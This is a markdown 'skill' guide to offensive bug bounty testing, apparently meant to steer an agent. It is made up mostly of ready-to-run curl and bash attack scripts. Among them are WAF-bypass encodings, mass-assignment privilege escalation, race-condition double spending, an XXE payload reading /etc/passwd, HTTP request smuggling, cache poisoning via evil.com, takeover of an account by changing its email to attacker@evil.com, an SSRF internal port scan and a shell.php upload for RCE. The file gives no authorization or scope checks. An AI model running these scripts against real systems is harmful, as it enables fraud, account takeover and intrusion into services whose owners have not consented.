# HIDDEN2.md — Advanced Intelligence-Driven Bug Bounty Skill
## Pattern Understanding · Creative Bypassing · Deep Architectural Reasoning · Infinite Chaining

> **CORE PHILOSOPHY**: Don't scan blindly. UNDERSTAND the system. Every response is a signal. Every header is intelligence. Every error is a map. Every timing difference is a side channel. Think like the developer who built it, then find where their mental model collapsed.

---

## ═══════════════════════════════════════════════
## INTELLIGENCE RULE SET — READ BEFORE EVERYTHING
## ═══════════════════════════════════════════════

```
INTELLIGENCE LAW 1:  The exposed surface tells you about the HIDDEN surface. Always infer.
INTELLIGENCE LAW 2:  Errors are your best friend — they reveal source paths, frameworks, DB queries.
INTELLIGENCE LAW 3:  Timing is data — microsecond differences reveal backend branching logic.
INTELLIGENCE LAW 4:  Two correct responses that DIFFER expose a parser differential. Exploit it.
INTELLIGENCE LAW 5:  The developer's mental shortcut is your attack vector. Find where they stopped thinking.
INTELLIGENCE LAW 6:  One endpoint validated → assume ALL similar endpoints have the same flaw.
INTELLIGENCE LAW 7:  The frontend validation and backend validation are NEVER the same. Exploit the gap.
INTELLIGENCE LAW 8:  Internal services trust each other completely. Pivot laterally once inside.
INTELLIGENCE LAW 9:  Legacy code always lives alongside new code. Find the migration seam.
INTELLIGENCE LAW 10: Rate limits, WAFs, and auth checks are applied inconsistently. Find the exception.
INTELLIGENCE LAW 11: Every microservice has its own bug surface. Map the topology, then test each node.
INTELLIGENCE LAW 12: CHAIN EVERYTHING. A P4 info leak + P4 IDOR + P4 timing = P1 Critical.
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 01 — DECONSTRUCT VISIBLE ARCHITECTURE
## Infer State Machines & Unmapped Control Flows
## ═══════════════════════════════════════════════

### Concept
When you see a feature in the UI, you're seeing the OUTPUT of a state machine. The STATES and TRANSITIONS of that machine are your attack surface — not the buttons. Map every state the system can be in, then find the transitions that were never supposed to be accessible.

### Deep Execution

```bash
TARGET="https://TARGET"

# STEP 1: Map every UI state by observing network traffic patterns
# What API calls does "Create Order" trigger? Log them ALL.
# Example observed flow:
#   POST /api/order/create           → {order_id: "abc123", status: "pending"}
#   POST /api/payment/initialize     → {payment_id: "pay_xyz", status: "pending"}
#   GET  /api/payment/pay_xyz/status → {status: "processing"}
#   POST /api/order/abc123/confirm   → {status: "confirmed"}

# STEP 2: Identify the states
# States found: pending → processing → confirmed → shipped → delivered → refunded
# Question: What happens if you skip "processing" and call "confirm" directly?

curl -sk -X POST "$TARGET/api/order/abc123/confirm" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"payment_status":"paid"}' \
  | python3 -m json.tool

# STEP 3: Reverse state machine — go BACKWARDS
# What if you call "refund" on a pending (unpaid) order?
curl -sk -X POST "$TARGET/api/order/abc123/refund" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json"

# STEP 4: Inject impossible state transitions
# Try to go from "pending" directly to "delivered"
curl -sk -X PUT "$TARGET/api/order/abc123" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"delivered"}'

# STEP 5: Test ALL state-changing endpoints with WRONG state preconditions
# The developer only tested the "happy path" — test the broken paths
```

### What to Look For
- `200 OK` on a state transition that should be impossible
- Order total discrepancy (order goods without paying)
- Refund processed without prior payment
- Confirmation without inventory deduction

### Chain Pattern
```
State Skip → Business Logic Bypass → Financial Impact → P1 Critical
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 02 — ISOLATE CORE LOGIC FROM OBFUSCATION
## Strip Defensive Noise, Find True Execution Path
## ═══════════════════════════════════════════════

### Concept
Every defensive layer (WAF, rate limiter, auth middleware) wraps core logic. The core logic doesn't care about defense — it just processes input. Find the path that reaches the core while bypassing the wrappers.

### Deep Execution

```bash
TARGET="https://TARGET"

# STEP 1: Identify all defensive layers
# Layer 1: WAF (Cloudflare, Akamai, ModSecurity)
# Layer 2: API Gateway (Kong, AWS API GW, Nginx)
# Layer 3: Auth Middleware (JWT validation)
# Layer 4: Input validation (regex, type checking)
# Layer 5: Core business logic (the actual vulnerable code)

# STEP 2: Map each layer's behavior
# Send a clean request → note response
curl -sk "$TARGET/api/user/1" -H "Authorization: Bearer TOKEN"

# STEP 3: Systematically disable/bypass each layer
# Bypass WAF — Unicode encoding
curl -sk "$TARGET/api/user/１" -H "Authorization: Bearer TOKEN"
# ① = Unicode fullwidth 1 — bypasses regex WAF, core sees "1"

# Bypass WAF — HTTP Parameter Pollution
curl -sk "$TARGET/api/user/1&id=2" -H "Authorization: Bearer TOKEN"

# Bypass WAF — Chunked encoding confusion
curl -sk "$TARGET/api/search" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Type: application/json" \
  --data-binary $'5\r\n{"a":\r\n6\r\n"test"}\r\n0\r\n\r\n'

# STEP 4: Test the core endpoint DIRECTLY if microservices are exposed
# Sometimes the "real" service runs on a different port
for port in 3000 3001 4000 4001 5000 8000 8001 8080 8081 8443 9000 9090; do
  STATUS=$(curl -sk -o /tmp/port_resp.txt -w "%{http_code}" --connect-timeout 2 "$TARGET:$port/api/user/1")
  [ "$STATUS" = "200" ] && echo "[DIRECT BACKEND EXPOSED] Port $port"
done
```

### Intelligence Insight
When WAF blocks `/api/admin` but allows `/api/admin/`, the WAF is checking exact strings but Nginx routes both to the same handler. The middleware TRIMS trailing slashes before passing to the controller. The developer never considered this case.

---

## ═══════════════════════════════════════════════
## TECHNIQUE 03 — MAP IMPLICIT DEPENDENCIES
## Turn Surface Noise Into Predictable Execution Paths
## ═══════════════════════════════════════════════

### Concept
Every system has hidden communication channels: service-to-service calls, message queues, webhooks, cron jobs. Finding these gives you attack surface that nobody documented.

### Deep Execution

```bash
TARGET="https://TARGET"

# STEP 1: Find callback/webhook endpoints by studying the main flows
# A payment system MUST have a payment provider callback
# Common webhook receiver paths:
WEBHOOK_PATHS=(
  "/webhook" "/webhooks" "/webhook/stripe" "/webhook/paypal"
  "/webhook/twilio" "/webhook/sendgrid" "/webhook/github"
  "/callback" "/callbacks" "/notify" "/notification" "/notifications"
  "/ipn" "/hook" "/hooks" "/event" "/events"
  "/payment/callback" "/payment/notify" "/payment/webhook"
  "/api/webhook" "/api/callback" "/api/notify"
  "/stripe/webhook" "/paypal/ipn" "/braintree/webhook"
)

for path in "${WEBHOOK_PATHS[@]}"; do
  STATUS=$(curl -sk -o /tmp/wh_resp.txt -w "%{http_code}" -X POST \
    -H "Content-Type: application/json" \
    -d '{"event":"payment.success","amount":100,"status":"paid"}' \
    "$TARGET$path")
  if [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ]; then
    echo "[$STATUS] $TARGET$path"
    head -3 /tmp/wh_resp.txt
  fi
done

# STEP 2: Map async job queues by observing delayed responses
# If a request triggers an async job, the response comes back instantly
# but a SECONDARY effect (email, file, notification) happens seconds later
# Test: Submit a job → poll for side effects

# STEP 3: Find cron job artifacts
# Cron jobs often leave log files or status endpoints
CRON_INDICATORS=(
  "/cron" "/cron.php" "/cron/run" "/api/cron" "/admin/cron"
  "/maintenance" "/jobs" "/jobs/status" "/queue" "/queue/status"
  "/worker" "/workers" "/background" "/scheduler"
  "/api/tasks" "/api/jobs" "/api/jobs/run"
)

for path in "${CRON_INDICATORS[@]}"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  [ "$STATUS" != "404" ] && echo "[$STATUS] $TARGET$path"
done

# STEP 4: Discover service-to-service auth via header analysis
# Internal services often accept requests with "X-Internal-Auth" or "X-Service-Key"
curl -sk "$TARGET/api/internal/users" -H "X-Internal-Auth: true"
curl -sk "$TARGET/api/internal/users" -H "X-Service-Auth: internal"
curl -sk "$TARGET/api/internal/users" -H "X-Internal-Request: 1"
curl -sk "$TARGET/api/internal/users" -H "X-Forwarded-For: 10.0.0.1" -H "X-Internal: true"
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 04 — CHAIN MICRO-ANOMALIES
## Combine Minor Logic Flaws Into Compound High-Impact Bypasses
## ═══════════════════════════════════════════════

### Concept
A P4 finding alone is useless. But three P4 findings chained together can become a P1. Learn to recognize which small anomalies can be combined.

### Micro-Anomaly Types & How to Chain

```bash
TARGET="https://TARGET"

# ANOMALY TYPE A: Mass Assignment (score alone: P4)
# Found: POST /api/user/profile accepts "role" field (ignored in normal flow)
curl -sk -X PUT "$TARGET/api/user/profile" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","is_admin":true,"admin":1}'

# ANOMALY TYPE B: IDOR on lookup (score alone: P3)
# Found: GET /api/user/12345 accessible by other users
curl -sk "$TARGET/api/user/12345" -H "Authorization: Bearer USER_TOKEN"

# ANOMALY TYPE C: Stale session not invalidated on role change (score alone: P4)
# Found: Old tokens remain valid after role changes

# CHAIN: A + B + C = Account Takeover + Privilege Escalation = P1
# Step 1: Use IDOR to find admin user ID (anomaly B)
# Step 2: Use mass assignment to set YOUR account's role to admin (anomaly A)
# Step 3: Your old token still works with new role (anomaly C)
# Result: You are now admin, old token valid, no new login required

# ─────────────────────────────────────────────────────────

# ANOMALY TYPE D: Email verification bypass (alone: P3)
# PUT /api/user/email accepts new email without reverification
curl -sk -X PUT "$TARGET/api/user/email" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'

# ANOMALY TYPE E: Password reset via email (alone: not a bug)
# POST /api/auth/reset sends reset link to account email

# CHAIN: D + E = Account Takeover of ANY user
# Step 1: Change victim's email to yours (anomaly D, no reverification)
# Step 2: Request password reset for victim account → link goes to YOUR email
# Step 3: Reset password → full ATO
```

### Systematic Chain Discovery Script

```bash
TARGET="https://TARGET"
TOKEN="USER_TOKEN"

echo "[PROBING MASS ASSIGNMENT PARAMETERS]"
# Try every common privilege-escalation parameter on every writable endpoint
PRIV_PARAMS=('{"role":"admin"}' '{"is_admin":true}' '{"admin":1}' '{"privilege":"superuser"}' '{"access_level":99}' '{"tier":"enterprise"}' '{"permissions":["admin","write","read","delete"]}')

WRITE_ENDPOINTS=("/api/user/profile" "/api/user/settings" "/api/account" "/api/me")
for endpoint in "${WRITE_ENDPOINTS[@]}"; do
  for payload in "${PRIV_PARAMS[@]}"; do
    RESPONSE=$(curl -sk -X PUT "$TARGET$endpoint" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "$payload")
    echo "[$endpoint] [$payload] → $RESPONSE" | head -c 200
    echo ""
  done
done
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 05 — OBSERVE TRANSIENT BEHAVIORS
## Track Split-Second State Changes, Find Ephemeral Endpoints
## ═══════════════════════════════════════════════

### Concept
Race conditions and transient states are bugs that exist for milliseconds. The developer never thought about what happens when TWO requests hit the same code simultaneously. Find the gap.

### Deep Race Condition Testing

```bash
TARGET="https://TARGET"
TOKEN="USER_TOKEN"

# RACE CONDITION TYPE 1: Double-spending (send money twice simultaneously)
# If the balance check and deduction aren't in the same DB transaction, both pass

# Single threaded baseline — confirm endpoint works
curl -sk -X POST "$TARGET/api/transfer" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"to":"attacker_account","amount":100}'

# Parallel race attack — ALL requests fire at exactly the same millisecond
# Using GNU parallel for true parallel execution:
for i in $(seq 1 20); do
  curl -sk -X POST "$TARGET/api/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"to":"attacker_account","amount":100}' &
done
wait
# If balance was 100 and 3 transfers succeeded → race condition = P1 Critical

# RACE CONDITION TYPE 2: Coupon/voucher usage race
# Apply same coupon code 20 times simultaneously
COUPON="SAVE50"
for i in $(seq 1 20); do
  curl -sk -X POST "$TARGET/api/coupon/apply" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"code\":\"$COUPON\",\"order_id\":\"order_123\"}" &
done
wait

# RACE CONDITION TYPE 3: Email verification token race
# Two accounts try to verify at exact same millisecond
# Sometimes the wrong account gets verified as the other

# RACE CONDITION TYPE 4: Invitation link race
# Use same invite link twice simultaneously before it's invalidated
INVITE_TOKEN="abc123"
for i in $(seq 1 10); do
  curl -sk -X POST "$TARGET/api/invite/accept" \
    -H "Content-Type: application/json" \
    -d "{\"token\":\"$INVITE_TOKEN\"}" &
done
wait
```

### Timing-Based Transient State Detection

```bash
# Measure response time distribution to detect asynchronous gaps
TARGET="https://TARGET/api/order/create"

for i in $(seq 1 10); do
  TIME=$(curl -sk -X POST "$TARGET" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"item_id":1,"quantity":1}' \
    -w "%{time_total}" -o /dev/null)
  echo "Request $i: ${TIME}s"
done

# If times vary wildly (0.1s, 0.1s, 2.3s, 0.1s) → async processing
# The 2.3s spike = synchronous path where race window exists
# Test that path for race conditions
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 06 — EXPLOIT BOUNDARY MISALIGNMENTS
## Edge-Case Character Encodings That Bypass Sanitization
## ═══════════════════════════════════════════════

### Concept
The WAF sees one thing, the backend sees another. The gap between what's validated and what executes is your attack surface.

### Encoding Arsenal

```bash
TARGET="https://TARGET"

# UNICODE NORMALIZATION ATTACKS
# The WAF checks for "/admin" and blocks it
# But the server normalizes Unicode AFTER the WAF check

# Full-width Unicode bypass
curl -sk "$TARGET/%EF%BC%8Fadmin"     # ／admin (fullwidth slash)
curl -sk "$TARGET/ａdmin"            # fullwidth 'a'
curl -sk "$TARGET/\u0041dmin"         # Unicode escape

# Case-folding bypass (some WAFs are case-sensitive, backends aren't)
curl -sk "$TARGET/ADMIN"
curl -sk "$TARGET/Admin"
curl -sk "$TARGET/aDmIn"

# URL encoding double-encode bypass
curl -sk "$TARGET/%2fadmin"           # /admin URL-encoded
curl -sk "$TARGET/%252fadmin"         # /admin double-encoded
curl -sk "$TARGET/..%2fadmin"
curl -sk "$TARGET/%2e%2e%2fadmin"

# Null byte injection (truncates the string in some backends)
curl -sk "$TARGET/admin%00.jpg"       # WAF sees .jpg, backend sees /admin
curl -sk "$TARGET/admin%00.css"
curl -sk "$TARGET/safe_file%00.php"

# Overlong UTF-8 sequences
curl -sk "$TARGET/%c0%afadmin"        # Invalid but some parsers accept
curl -sk "$TARGET/%e0%80%afadmin"     # 3-byte overlong /

# PATH SEPARATOR VARIATIONS
curl -sk "$TARGET/admin\\"            # Backslash (IIS normalizes to /)
curl -sk "$TARGET/admin%5cadmin"      # %5c = backslash
curl -sk "$TARGET/admin///"           # Multiple slashes
curl -sk "$TARGET/admin/./profile"    # Dot-segment
curl -sk "$TARGET/./admin"
curl -sk "$TARGET/admin;.js"          # Semicolon bypass (Spring Boot, Tomcat)
curl -sk "$TARGET/admin;param=value"
```

### Content-Type Boundary Attacks

```bash
TARGET="https://TARGET/api/data"

# Backend may parse based on Content-Type
# WAF validates JSON, but what if you send XML with JSON Content-Type?
curl -sk -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

# Or vice versa: XML endpoint that secretly parses JSON
curl -sk -X POST "${TARGET/api\/data/api\/xml-process}" \
  -H "Content-Type: application/xml" \
  -d '{"action":"admin"}'

# Multipart confusion
curl -sk -X POST "$TARGET" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  --data-binary $'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="__proto__"\r\n\r\n{"admin":true}\r\n------WebKitFormBoundary--'
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 07 — INFER BACKEND FROM TIMING DRIFT
## Async Job Queues, DB Schema, Hidden Processors
## ═══════════════════════════════════════════════

### Concept
When you send two identical requests but one is 300ms slower, the backend branched into a different code path. That different path might be a DB query, an email send, an async job, or a privilege check. Map it.

### Timing Side-Channel Analysis

```bash
TARGET="https://TARGET"

# TECHNIQUE: Boolean-based timing inference
# Test a parameter that might be checked in backend

# Baseline — request with non-existent user (should fail fast)
time curl -sk "$TARGET/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent_xyz_abc@fake.com","password":"test"}'
# → Time: 0.12s (fast — user not found, returns early)

# Test — request with real user but wrong password (might be slower if DB hit)
time curl -sk "$TARGET/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":"wrongpassword"}'
# → Time: 0.34s (slower — user was FOUND, then password check ran)
# INTELLIGENCE: admin@target.com IS A VALID EMAIL — user enumeration via timing!

# TECHNIQUE: DB column existence via error timing
# If a query on an existing column takes 50ms and non-existing takes 10ms:
for field in id email username password role admin_level token secret_key api_key; do
  TIME=$(curl -sk "$TARGET/api/search?field=$field&value=test" \
    -H "Authorization: Bearer TOKEN" \
    -w "%{time_total}" -o /dev/null)
  echo "Field '$field': ${TIME}s"
done
# Slower fields = VALID database columns

# TECHNIQUE: Feature flag detection via timing
# If a feature is toggled by a flag, checking for it takes slightly longer
for flag in beta premium enterprise internal debug admin trial; do
  TIME=$(curl -sk "$TARGET/api/user/profile?feature=$flag" \
    -H "Authorization: Bearer TOKEN" \
    -w "%{time_total}" -o /dev/null)
  echo "Feature '$flag': ${TIME}s"
done
```

### Async Queue Timing Map

```bash
TARGET="https://TARGET"

# Submit a job and measure when secondary effects occur
START=$(date +%s%3N)  # milliseconds

curl -sk -X POST "$TARGET/api/export/csv" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type":"all_users"}'

# Poll for job completion
for i in $(seq 1 30); do
  sleep 1
  STATUS=$(curl -sk "$TARGET/api/export/status" -H "Authorization: Bearer TOKEN")
  ELAPSED=$(( $(date +%s%3N) - START ))
  echo "${ELAPSED}ms: $STATUS"
  echo "$STATUS" | grep -q '"done"' && break
done

# INTELLIGENCE: 
# - Job finishes at 4200ms → queue processing happens every ~4s
# - This means other jobs submitted at similar times can be intercepted
# - IDOR on export job IDs becomes exploitable if IDs are sequential
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 08 — AUDIT STATE GAPS
## Out-of-Order Execution Paths Bypass Auth Steps
## ═══════════════════════════════════════════════

### Concept
Multi-step flows (checkout, password reset, 2FA) assume you go in order. They don't always verify that step 1 completed before allowing step 3. Skip steps.

### Deep Step-Skip Testing

```bash
TARGET="https://TARGET"

# SCENARIO: Password reset flow
# Normal: Request reset → Verify email OTP → Set new password
# Attack: Skip OTP verification step entirely

# STEP 1: Initiate reset — get a reset session
RESP=$(curl -sk -X POST "$TARGET/api/auth/reset/initiate" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}')
RESET_TOKEN=$(echo $RESP | python3 -c "import json,sys; print(json.load(sys.stdin).get('reset_token',''))")
echo "Reset token: $RESET_TOKEN"

# STEP 2: SKIP OTP verification — try to go directly to password change
curl -sk -X POST "$TARGET/api/auth/reset/complete" \
  -H "Content-Type: application/json" \
  -d "{\"reset_token\":\"$RESET_TOKEN\",\"new_password\":\"Hacked123!\"}"
# If this succeeds WITHOUT OTP → P1 ATO

# SCENARIO: Checkout flow
# Normal: Add to cart → Add shipping → Add payment → Confirm
# Attack: Jump to confirm without payment

# STEP 1: Create cart
CART=$(curl -sk -X POST "$TARGET/api/cart" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"item_id":1,"quantity":5}')
CART_ID=$(echo $CART | python3 -c "import json,sys; print(json.load(sys.stdin).get('cart_id',''))")

# STEP 2: Skip payment, go straight to confirm
curl -sk -X POST "$TARGET/api/order/confirm" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"cart_id\":\"$CART_ID\",\"payment_status\":\"paid\"}"
# If order is placed without payment_id being validated → Financial bug P1
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 09 — DECODE PROTOCOL HEADERS
## Find Hidden Reverse Proxies & Internal Targets
## ═══════════════════════════════════════════════

### Concept
Response headers reveal the entire infrastructure stack. A single response can tell you: CDN, load balancer, API gateway, backend framework, database ORM, queue system, and internal hostnames.

### Header Intelligence Extraction

```bash
TARGET="https://TARGET"

# Full verbose dump — analyze EVERY header
curl -sivk "$TARGET" 2>&1 | grep -E "^[<>*]" | head -80

# Extract and categorize headers
curl -sIk "$TARGET" | awk '{
  header = tolower($1)
  if (header ~ /server/) print "[WEB SERVER]", $0
  if (header ~ /x-powered-by/) print "[BACKEND LANG]", $0
  if (header ~ /x-cache/) print "[CACHE LAYER]", $0
  if (header ~ /via/) print "[PROXY CHAIN]", $0
  if (header ~ /x-amz/) print "[AWS INFRA]", $0
  if (header ~ /cf-ray/) print "[CLOUDFLARE]", $0
  if (header ~ /x-kong/) print "[KONG API GW]", $0
  if (header ~ /x-request-id/) print "[TRACING SYSTEM]", $0
  if (header ~ /x-b3/) print "[ZIPKIN TRACING]", $0
  if (header ~ /traceparent/) print "[OPENTELEMETRY]", $0
  if (header ~ /x-correlation-id/) print "[MICROSERVICES]", $0
  if (header ~ /x-runtime/) print "[RUBY/RAILS]", $0
  if (header ~ /x-content-type/) print "[SECURITY HEADER]", $0
  if (header ~ /strict-transport/) print "[HSTS]", $0
}'

# LOOK FOR INTERNAL HOSTNAMES IN HEADERS
curl -sIk "$TARGET" | grep -iE "(x-served-by|x-backend|x-upstream|location|x-forwarded-host)" | grep -oE '[a-z0-9._-]+\.(internal|local|corp|private|aws\.local|ec2\.internal)'

# LOOK FOR REQUEST TRACING IDs THAT REVEAL TOPOLOGY
# X-Request-Id: abc-123-xyz → might reveal service name
# X-B3-TraceId: → Zipkin tracing → can access /zipkin if exposed
# X-Amzn-Trace-Id: Root=1-abc-def → AWS X-Ray → reveals Lambda/ECS

# TEST: Is the Zipkin/Jaeger tracing dashboard exposed?
for path in /zipkin /zipkin/api/v2/services /jaeger /jaeger/api/services /trace /tracing; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  echo "[$STATUS] $TARGET$path"
done
```

### Via Header Deep Analysis

```bash
# Via: 1.1 vegur (Heroku)                → Heroku platform
# Via: 1.1 varnish (Varnish/5.6)         → Varnish cache — test PURGE method
# Via: 1.1 google                         → Google Cloud Load Balancer
# Via: kong/2.8.1                         → Kong API Gateway
# Via: 1.1 a1234.b.akamaiedge.net        → Akamai CDN

# If Varnish detected — test cache poisoning
curl -sk "$TARGET/" -H "X-Forwarded-Host: evil.com"
curl -sk "$TARGET/" -H "X-Host: evil.com"
curl -sk "$TARGET/" -H "Forwarded: host=evil.com"
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 10 — EXPLOIT MULTI-PARSER DIFFERENTIALS
## Same Payload, Different Interpretations
## ═══════════════════════════════════════════════

### Concept
When Request passes through WAF → API Gateway → Backend Service, each layer parses it differently. A carefully crafted payload can mean "safe" to the WAF but "dangerous" to the backend.

### Parser Differential Attack Patterns

```bash
TARGET="https://TARGET/api/user"

# DIFFERENTIAL 1: HTTP Parameter Pollution
# WAF sees: ?id=1&id=SELECT+*+FROM → takes FIRST value (id=1), allows it
# Backend sees: Both values, processes SECOND (SQL injection)
curl -sk "$TARGET?id=1&id=2"                    # Which one does backend use?
curl -sk "$TARGET?id[]=1&id[]=2"               # Array form
curl -sk "$TARGET?id=1;id=2"                    # Semicolon-separated

# DIFFERENTIAL 2: JSON Key Collision
# WAF validates first "role" key, Backend uses LAST (or vice versa)
curl -sk -X PUT "$TARGET/profile" \
  -H "Content-Type: application/json" \
  -d '{"role":"user","name":"test","role":"admin"}'
# JSON spec says duplicate keys are undefined behavior — parsers disagree

# DIFFERENTIAL 3: Content-Type Smuggling
# WAF validates as application/json
# Backend serves as text/html → XSS via JSON endpoint
curl -sk "$TARGET/api/data?callback=alert(1)" \
  -H "Accept: application/javascript"
# If response is: alert(1)({"data":...}) → stored XSS via JSONP

# DIFFERENTIAL 4: HTTP Request Smuggling (TE:CL / CL:TE)
# Front-end proxy uses Content-Length, backend uses Transfer-Encoding
# Allows smuggling a hidden request past the proxy
curl -sk -X POST "$TARGET/api/search" \
  -H "Content-Length: 13" \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n'
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 11 — BLUEPRINT INTERNAL TOPOLOGIES
## API Response Signatures → Internal Network Maps
## ═══════════════════════════════════════════════

### Concept
Every API response contains clues about what's behind it. Error messages, internal IPs, service names, database query errors — all of these map the internal network topology for you.

### Response Intelligence Mining

```bash
TARGET="https://TARGET"

# STEP 1: Trigger verbose errors systematically
# Type confusion → DB error revealing query structure
curl -sk "$TARGET/api/user" \
  -H "Content-Type: application/json" \
  -d '{"id":{"$gt":0}}' | python3 -m json.tool

# Stack overflow the parser
curl -sk -X POST "$TARGET/api/search" \
  -H "Content-Type: application/json" \
  -d "$(python3 -c "print('{' + ('\"a\":{' * 500) + '\"end\":1' + ('}' * 501))")"

# STEP 2: Extract IPs and hostnames from errors
curl -sk "$TARGET/api/db/query" \
  -H "Content-Type: application/json" \
  -d '{"query":"INVALID SQL HERE ---"}' \
  | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' # Internal IPs in DB error

# STEP 3: Map service discovery via error messages
# Errors that reveal internal architecture:
#   "Connection refused: redis://10.0.1.5:6379"     → Redis at 10.0.1.5
#   "MongoDB: timeout at db-primary.internal:27017"  → MongoDB hostname
#   "AMQP connection error: rabbitmq.corp:5672"      → RabbitMQ
#   "Kafka broker: kafka-01.internal:9092"           → Kafka
#   "ElasticSearch: es-cluster.internal:9200"        → Elasticsearch
#   "gRPC: upstream: user-service.default.svc:8080"  → Kubernetes service

# STEP 4: If SSRF found — map internal network
SSRF_ENDPOINT="$TARGET/api/fetch"

for host in 10.0.0.1 10.0.1.1 10.0.2.1 172.16.0.1 192.168.0.1 127.0.0.1; do
  for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
    RESP=$(curl -sk -X POST "$SSRF_ENDPOINT" \
      -H "Content-Type: application/json" \
      -d "{\"url\":\"http://$host:$port/\"}" \
      --max-time 3)
    echo "$RESP" | grep -qv "timeout\|refused\|error" && echo "[OPEN] $host:$port - $RESP" | head -c 100
  done
done
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 12 — DYNAMIC SCHEMA DEDUCTION
## Discover Non-Public API Parameters Systematically
## ═══════════════════════════════════════════════

### Concept
An API endpoint has MANY more parameters than what's documented. The developer wrote the code to accept debug fields, internal flags, admin overrides, and feature toggles that were never supposed to be called from outside. Find them by systematic variation.

### Parameter Discovery Engine

```bash
TARGET="https://TARGET/api/user/profile"
TOKEN="USER_TOKEN"

# STEP 1: Send base request, record response
BASE=$(curl -sk "$TARGET" -H "Authorization: Bearer $TOKEN")
echo "BASE RESPONSE: $BASE"

# STEP 2: Add one param at a time and observe response CHANGE
# Parameters that cause any response change = valid undocumented params
PARAMS=(
  "debug=true" "debug=1" "verbose=true" "verbose=1"
  "format=json" "format=xml" "format=full" "format=detailed"
  "include=all" "include=sensitive" "include=private" "include=admin"
  "expand=all" "expand=permissions" "expand=roles" "expand=metadata"
  "fields=all" "fields=*" "fields=password,secret,token"
  "admin=true" "admin=1" "is_admin=true" "superuser=true"
  "internal=true" "test=true" "dev=true" "beta=true"
  "override=true" "bypass=true" "skip_validation=true"
  "version=v2" "version=internal" "version=beta"
  "output=full" "output=raw" "output=debug"
  "context=admin" "context=internal" "context=system"
  "role=admin" "scope=admin" "access=all"
  "show_hidden=true" "include_deleted=true" "with_deleted=true"
  "all=true" "full=true" "complete=true"
  "page_size=1000" "limit=9999" "per_page=10000"
)

for param in "${PARAMS[@]}"; do
  RESP=$(curl -sk "$TARGET?$param" -H "Authorization: Bearer $TOKEN")
  if [ "$RESP" != "$BASE" ]; then
    DIFF_SIZE=$(( ${#RESP} - ${#BASE} ))
    echo "[CHANGED +${DIFF_SIZE}B] ?$param"
    echo "$RESP" | head -c 300
    echo "---"
  fi
done

# STEP 3: JSON Body parameter fuzzing (for POST/PUT endpoints)
BASE_BODY='{"name":"testuser"}'
BASE_RESP=$(curl -sk -X PUT "$TARGET" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "$BASE_BODY")

BODY_PARAMS=(
  '{"__debug":true}'
  '{"_internal":true}'
  '{"$admin":true}'
  '{"__admin__":true}'
  '{"system":true}'
  '{"_overridePermissions":true}'
  '{"skipValidation":true}'
  '{"bypassAuth":true}'
  '{"forceUpdate":true}'
)

for payload in "${BODY_PARAMS[@]}"; do
  MERGED="{\"name\":\"testuser\",$(echo $payload | sed 's/^{//;s/}$//')}"
  RESP=$(curl -sk -X PUT "$TARGET" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "$MERGED")
  if [ "$RESP" != "$BASE_RESP" ]; then
    echo "[BODY PARAM CHANGED] $MERGED"
    echo "$RESP" | head -c 200
    echo "---"
  fi
done
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 13 — BRIDGE VALIDATION REALITIES
## Frontend vs Backend Validation Gaps
## ═══════════════════════════════════════════════

### Concept
Frontend validation is cosmetic. Backend validation is real. But developers often forget to add backend validation when they think the frontend "prevents" certain inputs. Find everything the frontend blocks and test it directly against the backend.

### Frontend Bypass Patterns

```bash
TARGET="https://TARGET"

# PATTERN 1: File upload type restriction bypass
# Frontend JS blocks .php .exe — send directly to API
curl -sk -X POST "$TARGET/api/upload" \
  -H "Authorization: Bearer TOKEN" \
  -F "file=@/tmp/shell.php;type=image/jpeg" \
  -F "filename=profile.jpg"
# → If accepted, you have RCE

